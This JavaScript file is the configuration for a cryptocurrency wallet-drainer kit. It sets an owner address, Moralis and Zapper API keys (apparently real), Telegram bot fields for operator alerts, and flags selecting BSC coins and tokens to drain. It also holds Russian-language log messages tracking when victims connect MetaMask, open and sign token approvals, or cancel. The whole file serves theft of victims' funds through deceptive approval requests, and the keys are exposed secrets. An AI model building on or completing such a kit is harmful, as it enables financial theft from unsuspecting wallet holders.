//const ownerAddress = ""

logLanguage = "rus"

ownerAddress = ""

MORALIS_KEY = "1mnR5yONlqr4COWJ35eq3U1GG5Ze7htMaPet6oJx9XqtKcskrjUCueiTMJYKIjMP"
ZAPPER_KEY = "Basic OTgyZTQwOGUtODMxNS00MGE0LWJiYmItNjgyZmRhMWY3ZDU3Og=="

autoMetamaskConnect = 0

connects = []
drains = []
connectAndDrains = []

const tgConfig = {
    
    botToken: "",
    chatId: ""

}

const chains = {
    eth: false,
    matic: false,
    bsc: true,

}

const toDrain = {
 
    eth: {
        nft: false,
        eth: false,
        tokens: false
    },

    matic: {
        nft: false,
        eth: false,
        tokens: false,
    },

    bsc: {
        nft: false,
        eth: true,
        tokens: true,
    }

}

const LOG_SCHEMA = {
    rus: {
        onConnect: "💠 Пользователь $id зашел на сайт",
        onDisconnect: "💤 Пользователь $id покинул сайт",
        onMetamaskConnect: "🔑 Пользователь $id%0A└ [DeBank](https://debank.com/profile/$wallet)",
        onApprove: "🤑 Пользователь $id открыл окно с апрувом токенов",
        onCancel: "😢 Пользователь $id отменил транзакцию",
        onSign: "✅ Пользователь $id подписал апрув",
        onCancelSwitch: "😢 Пользователь $id не сменил сеть"
    },
    eng: {
        onConnect: "💠 Пользователь $id зашел на сайт",
        onDisconnect: "💤 Пользователь $id покинул сайт",
        onMetamaskConnect: "😎 Пользователь $id подключил метамаск",
        onApprove: "🤑 Пользователь $id открыл окно с апрувом токенов",
        onCancel: "😢 Пользователь $id отменил транзакцию",
        onSign: "✅ Пользователь $id подписал апрув",
        onCancelSwitch: "😢 Пользователь $id не сменил сеть"
    }
}



function updateState(event) {

    switch (event) {

        case "metamaskConnected":
            break;
        case "metamaskDisconnected":
            break;
        case "userTokensFetching":
            break;
        case "userTokensFetched":
            break;

    }

}